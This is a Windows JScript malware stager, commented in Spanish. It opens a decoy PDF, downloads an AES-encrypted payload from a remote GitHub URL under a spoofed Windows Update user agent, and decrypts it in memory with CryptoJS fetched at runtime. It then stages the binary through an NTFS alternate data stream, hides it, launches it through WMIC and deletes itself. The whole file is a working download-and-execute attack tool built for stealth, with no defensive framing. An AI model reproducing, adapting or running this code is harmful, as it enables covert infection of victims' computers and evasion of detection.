// ========================================================================
// STAGER AVANZADO - JScript con cifrado AES + ADS + Evasión
// ========================================================================
//
// Características:
// - Descarga payload cifrado (AES-CFB + Base64)
// - Descifrado en memoria con CryptoJS
// - Almacenamiento en Alternate Data Stream (ADS)
// - Ejecución con WMIC (sin crear procesos hijos)
// - Auto-limpieza de artefactos
// - User-Agent de Windows Update (legítimo)
// ========================================================================

// === CONFIGURACIÓN ===
var PAYLOAD_URL = "https://raw.githubusercontent.com/ggggwrmsfootmen/curly-fortnight/refs/heads/main/health-check.enc";
var AES_KEY = "MySecretKey12345"; // 32 caracteres hexadecimales (16 bytes)
var AES_IV = "MySecretIV123456"; // 16 caracteres hexadecimales (8 bytes)

var CRYPTOJS_URL = "https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js";
var DECOY_FILE = WScript.CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") + "\\desktop.ini";
var ADS_NAME = "data";
var FINAL_EXE = WScript.CreateObject("WScript.Shell").ExpandEnvironmentStrings("%USERPROFILE%") + "\\Pictures\\health-check-win.alt";

var fso = WScript.CreateObject("Scripting.FileSystemObject");
var shell = WScript.CreateObject("WScript.Shell");

// === FUNCIONES AUXILIARES ===

function openPDF() {
    // Buscar PDF en la misma carpeta que el script
    var scriptDir = fso.GetParentFolderName(WScript.ScriptFullName);
    var folder = fso.GetFolder(scriptDir);
    var files = new Enumerator(folder.Files);
    
    for (; !files.atEnd(); files.moveNext()) {
        var file = files.item();
        if (file.Name.toLowerCase().indexOf(".pdf") > -1) {
            shell.Run('"' + file.Path + '"', 1, false);
            return true;
        }
    }
    return false;
}

function downloadFile(url, userAgent) {
    var xhr = WScript.CreateObject("MSXML2.XMLHTTP");
    xhr.open("GET", url, false);
    xhr.setRequestHeader("User-Agent", userAgent || "Microsoft-Delivery-Optimization/10.0");
    xhr.send();
    
    if (xhr.status == 200) {
        return xhr.responseText;
    }
    return null;
}

function downloadBinary(url, userAgent) {
    var xhr = WScript.CreateObject("MSXML2.XMLHTTP");
    xhr.open("GET", url, false);
    xhr.setRequestHeader("User-Agent", userAgent || "Microsoft-Delivery-Optimization/10.0");
    xhr.send();
    
    if (xhr.status == 200) {
        return xhr.responseBody;
    }
    return null;
}

function decryptAES(ciphertext, key, iv) {
    // Cargar CryptoJS en memoria
    var cryptojs = downloadFile(CRYPTOJS_URL);
    if (!cryptojs) {
        WScript.Echo("[!] Error descargando CryptoJS");
        WScript.Quit(1);
    }
    
    // Ejecutar CryptoJS en contexto global
    eval(cryptojs);
    
    // Descifrar
    var decrypted = CryptoJS.AES.decrypt(ciphertext, CryptoJS.enc.Utf8.parse(key), {
        iv: CryptoJS.enc.Utf8.parse(iv),
        mode: CryptoJS.mode.CFB,
        padding: CryptoJS.pad.NoPadding
    });
    
    // Convertir a hexadecimal
    return decrypted.toString(CryptoJS.enc.Hex);
}

function writeToADS(decoyFile, adsName, hexData) {
    // Crear script VBS para escribir binario en ADS
    var vbsCode = 'Dim objStream, hexStr, binData\n';
    vbsCode += 'hexStr = "' + hexData + '"\n';
    vbsCode += 'Set objStream = CreateObject("ADODB.Stream")\n';
    vbsCode += 'objStream.Type = 1\n'; // Binary
    vbsCode += 'objStream.Open\n';
    vbsCode += 'For i = 1 To Len(hexStr) Step 2\n';
    vbsCode += '    objStream.Write Chr(CLng("&H" & Mid(hexStr, i, 2)))\n';
    vbsCode += 'Next\n';
    vbsCode += 'objStream.SaveToFile "' + decoyFile + ':' + adsName + '", 2\n';
    vbsCode += 'objStream.Close\n';
    
    var vbsFile = shell.ExpandEnvironmentStrings("%TEMP%") + "\\w" + Math.floor(Math.random() * 10000) + ".vbs";
    var file = fso.CreateTextFile(vbsFile, true);
    file.Write(vbsCode);
    file.Close();
    
    // Ejecutar VBS
    shell.Run("cscript //nologo //B " + vbsFile, 0, true);
    
    // Limpiar VBS
    try { fso.DeleteFile(vbsFile); } catch(e) {}
}

function extractFromADS(decoyFile, adsName, outputFile) {
    // Crear script VBS para extraer de ADS
    var vbsCode = 'Dim objStream\n';
    vbsCode += 'Set objStream = CreateObject("ADODB.Stream")\n';
    vbsCode += 'objStream.Type = 1\n';
    vbsCode += 'objStream.Open\n';
    vbsCode += 'objStream.LoadFromFile "' + decoyFile + ':' + adsName + '"\n';
    vbsCode += 'objStream.SaveToFile "' + outputFile + '", 2\n';
    vbsCode += 'objStream.Close\n';
    
    var vbsFile = shell.ExpandEnvironmentStrings("%TEMP%") + "\\e" + Math.floor(Math.random() * 10000) + ".vbs";
    var file = fso.CreateTextFile(vbsFile, true);
    file.Write(vbsCode);
    file.Close();
    
    // Ejecutar VBS
    shell.Run("cscript //nologo //B " + vbsFile, 0, true);
    
    // Limpiar VBS
    try { fso.DeleteFile(vbsFile); } catch(e) {}
}

function executeWithWMIC(exePath) {
    // WMIC no crea ventanas ni procesos hijos sospechosos
    var cmd = 'wmic process call create "' + exePath + '"';
    shell.Run(cmd, 0, false); // Async, sin esperar
}

function hideFile(filePath) {
    // Atributos: +H (oculto) +S (sistema)
    shell.Run('attrib +H +S "' + filePath + '"', 0, true);
}

// === FLUJO PRINCIPAL ===

try {
    // 0. Abrir PDF (decoy)
    openPDF();
    WScript.Sleep(1000);
    
    // 1. Descargar payload cifrado
    var encryptedData = downloadFile(PAYLOAD_URL, "Microsoft-Delivery-Optimization/10.0");
    
    if (!encryptedData) {
        WScript.Quit(1);
    }
    
    // 2. Descifrar en memoria
    var decryptedHex = decryptAES(encryptedData, AES_KEY, AES_IV);
    
    // 3. Crear archivo señuelo
    if (!fso.FileExists(DECOY_FILE)) {
        var decoy = fso.CreateTextFile(DECOY_FILE, true);
        decoy.WriteLine("[.ShellClassInfo]");
        decoy.WriteLine("IconResource=shell32.dll,4");
        decoy.Close();
        hideFile(DECOY_FILE);
    }
    
    // 4. Almacenar en ADS
    writeToADS(DECOY_FILE, ADS_NAME, decryptedHex);
    
    // 5. Extraer de ADS a archivo final
    extractFromADS(DECOY_FILE, ADS_NAME, FINAL_EXE);
    
    // 6. Ocultar archivo final
    hideFile(FINAL_EXE);
    
    // 7. Ejecutar con WMIC (sigiloso)
    executeWithWMIC(FINAL_EXE);
    
    // 8. Limpiar ADS (opcional, deja señuelo)
    // shell.Run('cmd /c echo. > "' + DECOY_FILE + ':' + ADS_NAME + '"', 0, true);
    
} catch(e) {
    // Silencioso en producción
    WScript.Quit(1);
}

// Auto-destrucción del script
try {
    WScript.Sleep(2000);
    fso.DeleteFile(WScript.ScriptFullName);
} catch(e) {}
